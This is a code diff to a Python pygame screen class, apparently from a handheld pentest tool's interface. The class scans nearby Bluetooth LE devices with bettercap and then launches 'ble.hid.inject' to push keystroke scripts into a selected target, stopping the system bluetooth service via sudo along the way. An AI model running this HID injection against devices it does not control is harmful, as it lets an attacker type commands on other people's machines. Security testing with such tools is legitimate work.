@@ -27,7 +27,6 @@ class BadBLEScreen(Screen):
         self.script_cursor = 0
         self.selected_target = None
         self.selected_script = None
-        self.iface = self._get_best_iface()
         
         self.status = "IDLE"
         self.error_msg = ""
@@ -42,13 +41,6 @@ class BadBLEScreen(Screen):
         self._scan_thread = None
         
         self._start_scan()
-
-    def _get_best_iface(self) -> str:
-        try:
-            out = subprocess.check_output(["hciconfig"]).decode()
-            if "hci1" in out: return "hci1"
-        except: pass
-        return "hci0"
 
     def _ensure_sample_script(self):
         sample = self.script_dir / "hello.txt"
@@ -88,8 +80,6 @@ class BadBLEScreen(Screen):
                 self.selected_script = self.scripts[self.script_cursor]
                 self._start_attack()
                 self.phase = PHASE_ATTACK
-            elif self.phase == PHASE_ATTACK:
-                pass # Already running
 
         elif action == "X": # Rescan
             if self.phase == PHASE_SCAN:
@@ -105,24 +95,35 @@ class BadBLEScreen(Screen):
         self._scan_thread.start()
 
     def _scan_loop(self):
-        # We use bettercap in non-interactive mode to grab devices
-        # ble.recon on; ble.show; q
-        cmd = ["sudo", "bettercap", "-iface", self.iface, "-eval", "ble.recon on; sleep 5; ble.show; q", "-no-colors"]
+        # Stop system BT briefly to free adapter
+        subprocess.run(["sudo", "systemctl", "stop", "bluetooth"], capture_output=True)
+        # Scan
+        cmd = ["sudo", "bettercap", "-eval", "ble.recon on; sleep 6; ble.show; q", "-no-colors"]
         try:
             out = subprocess.check_output(cmd).decode()
-            # Parse table: | 5c:c5:d4:61:52:6a | -68 dBm | ... | Name |
+            # More robust parsing for bettercap tables
             found = []
             for line in out.splitlines():
-                m = re.search(r"([0-9a-fA-F:]{17})\s+\|\s+-\d+\s+dBm\s+\|\s+.*\|\s+(.*)\s+\|", line)
-                if m:
-                    mac, name = m.group(1), m.group(2).strip()
-                    if not name or name == "<null>": name = "Unknown"
-                    found.append({"mac": mac, "name": name})
+                # Format: │ -40 dBm │ 02:38:30:7f:f7:44 │ Microsoft   │ ...
+                parts = [p.strip() for p in line.split("│") if p.strip()]
+                if len(parts) >= 3:
+                    mac_match = re.search(r"([0-9a-fA-F:]{17})", parts[1])
+                    if mac_match:
+                        mac = mac_match.group(1)
+                        # Vendor or Name
+                        name = parts[2]
+                        if len(parts) >= 6 and parts[5] and parts[5] != "✖" and parts[5] != "✔":
+                            name = parts[5]
+                        found.append({"mac": mac, "name": name})
+            
             self.devices = found
             self.status = f"FOUND {len(found)} DEVICES"
         except Exception as e:
             self.error_msg = str(e)
             self.status = "SCAN FAILED"
+        finally:
+            # Restart BT so UI wifi/etc works (optional, maybe keep off)
+            subprocess.run(["sudo", "systemctl", "start", "bluetooth"], capture_output=True)
 
     def _load_scripts(self):
         self.scripts = sorted([f for f in self.script_dir.glob("*.txt")])
@@ -134,13 +135,13 @@ class BadBLEScreen(Screen):
         threading.Thread(target=self._attack_loop, daemon=True).start()
 
     def _attack_loop(self):
-        # bettercap command for BadBLE HID injection
+        subprocess.run(["sudo", "systemctl", "stop", "bluetooth"], capture_output=True)
         mac = self.selected_target["mac"]
         script_path = str(self.selected_script.absolute())
         
         cmd = [
-            "sudo", "bettercap", "-iface", self.iface,
-            "-eval", f"ble.recon on; ble.enum {mac}; ble.hid.inject {mac} {script_path}; sleep 5; q",
+            "sudo", "bettercap", 
+            "-eval", f"ble.recon on; ble.enum {mac}; ble.hid.inject {mac} {script_path}; sleep 10; q",
             "-no-colors"
         ]
         try:
@@ -154,6 +155,8 @@ class BadBLEScreen(Screen):
         except Exception as e:
             self.error_msg = str(e)
             self.status = "ATTACK FAILED"
+        finally:
+            subprocess.run(["sudo", "systemctl", "start", "bluetooth"], capture_output=True)
 
     def _stop_all(self):
         self._stop_event.set()
@@ -212,11 +215,16 @@ class BadBLEScreen(Screen):
                 pygame.draw.rect(surf, theme.color("tile_sel"), (area.x, y, area.width, row_h), border_radius=4)
                 pygame.draw.rect(surf, theme.color("accent"), (area.x, y, area.width, row_h), width=1, border_radius=4)
             
-            main_text = getattr(item, key_main) if hasattr(item, key_main) else (item.get(key_main) if isinstance(item, dict) else str(item.name))
+            main_text = ""
+            if isinstance(item, dict):
+                main_text = item.get(key_main, "Unknown")
+            else:
+                main_text = str(item.name)
+                
             surf.blit(theme.font("ui").render(main_text[:25], True, theme.color("text")), (area.x + 5, y + 2))
             
-            if key_small:
-                sub_text = item.get(key_small)
+            if key_small and isinstance(item, dict):
+                sub_text = item.get(key_small, "")
                 surf.blit(theme.font("small").render(sub_text, True, theme.color("text_dim")), (area.right - 140, y + 5))
 
     def hints(self):
